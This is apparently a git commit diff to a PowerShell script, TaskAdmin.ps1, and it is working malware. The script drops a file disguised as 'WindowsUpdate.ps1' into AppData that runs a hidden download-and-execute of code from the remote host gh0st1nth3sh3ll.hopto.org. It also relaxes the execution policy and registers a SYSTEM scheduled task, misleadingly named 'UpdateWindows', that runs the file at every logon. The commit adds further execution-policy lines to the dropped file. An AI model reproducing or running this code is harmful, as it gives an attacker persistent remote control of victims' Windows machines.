7f91b968202cb33dc47f70ca6ac5384aaf92d5ca
Gh0st1nTh3Sh3ll1 <Gh0st1nTh3Sh3llUIT@gmail.com>
2017-03-23 21:50:44 +0700

    Update TaskAdmin.ps1

--- TaskAdmin.ps1
+++ TaskAdmin.ps1
@@ -1,4 +1,4 @@
-echo "powershell.exe -nop -w hidden -c $('"') IEX ((new-object net.webclient).downloadstring('http://gh0st1nth3sh3ll.hopto.org:443/a'))$('"')"  > C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1                           
+echo "set-executionpolicy unrestricted -force`nSet-ExecutionPolicy RemoteSigned -force`npowershell.exe -nop -w hidden -c $('"') IEX ((new-object net.webclient).downloadstring('http://gh0st1nth3sh3ll.hopto.org:443/a'))$('"')"  > C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1                           
 set-executionpolicy unrestricted -force
 Set-ExecutionPolicy RemoteSigned -force
 schtasks.exe /create /ru "System" /sc ONLOGON /tn UpdateWindows /tr "powershell.exe -nop -w hidden -file C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1" /f
